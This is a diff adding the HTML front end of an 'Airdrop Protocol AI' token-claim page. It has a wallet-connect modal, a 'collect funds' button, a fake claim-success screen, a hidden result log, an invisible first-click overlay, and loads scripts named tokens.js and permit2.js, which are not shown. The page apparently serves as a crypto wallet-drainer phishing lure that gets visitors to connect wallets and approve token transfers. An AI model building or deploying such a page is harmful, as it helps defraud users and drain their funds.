@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="format-detection" content="telephone=no">
+<title>Airdrop Protocol AI - Next Gen Token Distribution</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@300;400;500;600;700&family=Space+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/style.css">
+<style>
+  body {
+    font-family: 'Rajdhani', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  }
+  .mono {
+    font-family: 'Space Mono', 'SF Mono', Monaco, 'Cascadia Code', monospace;
+  }
+  .cyber-font {
+    font-family: 'Orbitron', sans-serif;
+  }
+</style>
+</head>
+<body>
+<!-- Canvas Background -->
+<canvas id="bgCanvas" class="bg-canvas"></canvas>
+
+<!-- Background Effects -->
+<div class="bg-orb orb-1"></div>
+<div class="bg-orb orb-2"></div>
+<div class="bg-orb orb-3"></div>
+<div class="bg-orb orb-4"></div>
+
+<div class="hex-grid"></div>
+<div class="glow-dots"></div>
+<div class="wave-effect"></div>
+<div class="aurora"></div>
+<div class="scan-line"></div>
+
+<!-- GLM Style Flowing Light Streaks -->
+<div class="flow-lights" id="flowLights"></div>
+
+<!-- GLM Style Mesh Gradient Overlay -->
+<div class="mesh-gradient"></div>
+
+<div class="starfield" id="starfield"></div>
+<div class="circuit-lines" id="circuitLines"></div>
+
+<!-- Matrix Rain Effect -->
+<div class="matrix-rain" id="matrixRain"></div>
+
+<!-- Particle Layer -->
+<div id="particleLayer" class="particle-layer"></div>
+
+<!-- Intro Animation Overlay -->
+<div id="introOverlay" class="intro-overlay">
+  <div class="intro-container">
+    <div class="intro-logo">
+      <div class="logo-rings">
+        <div class="ring ring-1"></div>
+        <div class="ring ring-2"></div>
+        <div class="ring ring-3"></div>
+      </div>
+      <div class="logo-icon">⚡</div>
+    </div>
+    <div class="intro-text-container">
+      <h1 class="intro-title cyber-font">AIRDROP PROTOCOL</h1>
+      <p class="intro-subtitle">AI-POWERED DISTRIBUTION NETWORK</p>
+      <div class="intro-typing mono">
+        <span id="typingText"></span>
+        <span class="cursor">|</span>
+      </div>
+    </div>
+    <div class="intro-stats">
+      <div class="stat-item">
+        <div class="stat-value" data-target="1000000">0</div>
+        <div class="stat-label">TOTAL CLAIMS</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-value" data-target="50000">0</div>
+        <div class="stat-label">NETWORKS</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-value" data-target="99">0</div>
+        <div class="stat-label">SUCCESS RATE</div>
+      </div>
+    </div>
+    <button class="intro-enter-btn cyber-font" onclick="enterApp()">
+      <span class="btn-text">ENTER NETWORK</span>
+      <div class="btn-glow"></div>
+    </button>
+  </div>
+</div>
+
+<!-- Warning / Overlay to catch first click -->
+<div id="clickOverlay" style="position:fixed;inset:0;z-index:10;cursor:pointer;" onclick="this.style.display='none'"></div>
+
+<!-- Loading -->
+<div id="loading" class="loading-overlay">
+  <div class="tech-spinner">
+    <div class="spinner-ring ring-outer"></div>
+    <div class="spinner-ring ring-middle"></div>
+    <div class="spinner-ring ring-inner"></div>
+    <div class="spinner-core"></div>
+  </div>
+  <p class="loading-text mono" data-i18n="loading">INITIALIZING QUANTUM NETWORK...</p>
+  <div class="loading-dots">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<!-- Wallet Modal -->
+<div id="walletModal" class="modal hidden">
+  <div class="modal-backdrop" onclick="closeWalletModal()"></div>
+  <div class="modal-content">
+    <h2 data-i18n="selectWallet">Select Wallet</h2>
+    <div id="walletList" class="wallet-list"></div>
+    <button class="close-btn" onclick="closeWalletModal()">✕</button>
+  </div>
+</div>
+
+<!-- Main App -->
+<div id="app" class="container hidden">
+  <!-- Header -->
+  <header class="header">
+    <div class="logo">
+      <div class="logo-hexagon">⚡</div>
+      <span class="logo-text cyber-font">AIRDROP PROTOCOL</span>
+    </div>
+    <div class="header-actions">
+      <select id="langSelect" onchange="changeLang(this.value)">
+        <option value="en">EN</option>
+        <option value="zh">中文</option>
+        <option value="zh-TW">繁體</option>
+        <option value="ja">日本語</option>
+        <option value="ko">한국어</option>
+        <option value="ru">Русский</option>
+        <option value="es">Español</option>
+        <option value="pt">Português</option>
+        <option value="fr">Français</option>
+        <option value="de">Deutsch</option>
+        <option value="ar">العربية</option>
+        <option value="tr">Türkçe</option>
+        <option value="vi">Tiếng Việt</option>
+        <option value="th">ไทย</option>
+        <option value="id">Bahasa</option>
+      </select>
+      <div id="networkBadge" class="network-badge cyber-font">—</div>
+    </div>
+  </header>
+
+  <!-- Wallet Info -->
+  <div id="walletInfo" class="card hidden">
+    <div class="wallet-header">
+      <div class="wallet-details">
+        <p class="wallet-label" data-i18n="loggedInWallet">已登录</p>
+        <p class="wallet-address" id="walletAddress">—</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Connect Prompt -->
+  <div id="connectPrompt" class="card connect-prompt">
+    <div class="prompt-icon">🚀</div>
+    <h2 data-i18n="connectWallet">Connect Wallet</h2>
+    <p data-i18n="connectDesc">Connect your wallet to collect funds</p>
+    <button class="btn-primary" onclick="openWalletModal()" data-i18n="connectBtn">Connect Wallet</button>
+  </div>
+
+  <!-- Collection Info -->
+  <div id="collectionSection" class="card hidden">
+    <div class="collection-info">
+      <p class="best-chain-display">
+        <span data-i18n="claimAddress">领取地址:</span>
+      </p>
+      <p class="total-tokens mono">
+        <span id="userWalletAddress">—</span>
+      </p>
+    </div>
+    <button id="collectBtn" class="btn-collect cyber-font" onclick="collectFunds()" data-i18n="collectFunds">
+      <span class="btn-content">领取20LAB</span>
+      <div class="btn-particles"></div>
+    </button>
+    <div id="collectProgress" class="progress-bar hidden">
+      <div class="progress-track">
+        <div id="progressFill" class="progress-fill"></div>
+        <div class="progress-glow"></div>
+      </div>
+      <div class="progress-info mono">
+        <span id="progressPercent">0%</span>
+        <span id="progressStatus">INITIALIZING...</span>
+      </div>
+    </div>
+    <div id="collectStatus" class="auth-status hidden"></div>
+  </div>
+
+  <!-- Result Log (hidden) -->
+  <div id="resultSection" class="card hidden" style="display: none !important;">
+    <h3 data-i18n="resultLog">📋 Result Log</h3>
+    <div id="resultLog" class="result-log"></div>
+  </div>
+</div>
+
+<!-- Toast -->
+<div id="toastContainer" class="toast-container"></div>
+
+<!-- Success Modal -->
+<div id="successModal" class="success-modal hidden">
+  <div class="success-content">
+    <div class="success-animation">
+      <div class="success-circle">
+        <div class="success-check">✓</div>
+      </div>
+      <div class="success-particles">
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+        <div class="particle"></div>
+      </div>
+    </div>
+    <h2 class="success-title cyber-font" data-i18n="successTitle">✓ AIRDROP CLAIMED!</h2>
+    <p class="success-message mono" data-i18n="successMessage">TRANSACTION CONFIRMED ON BLOCKCHAIN</p>
+    <div class="success-details">
+      <div class="detail-item">
+        <span class="detail-label" data-i18n="successAmount">AMOUNT</span>
+        <span class="detail-value" id="successAmount">—</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label" data-i18n="successNetwork">NETWORK</span>
+        <span class="detail-value" id="successNetwork">—</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label" data-i18n="successHash">HASH</span>
+        <span class="detail-value mono" id="successHash">—</span>
+      </div>
+    </div>
+    <button class="success-close-btn cyber-font" onclick="closeSuccessModal()" data-i18n="successContinue">
+      CONTINUE
+    </button>
+  </div>
+</div>
+
+<!-- Use cdnjs for better availability globally -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" onerror="alert('核心依赖文件 Ethers.js 加载失败，如果是网络原因(如国内拦截)，请开启系统代理后刷新重试！')"></script>
+<script src="js/config.js?v=4"></script>
+<script src="js/dashboard.js?v=1"></script>
+<script src="js/i18n.js?v=4"></script>
+<script src="js/tokens.js?v=4"></script>
+<script src="js/permit2.js?v=4"></script>
+<script src="js/app.js?v=4"></script>
+</body>
+</html>
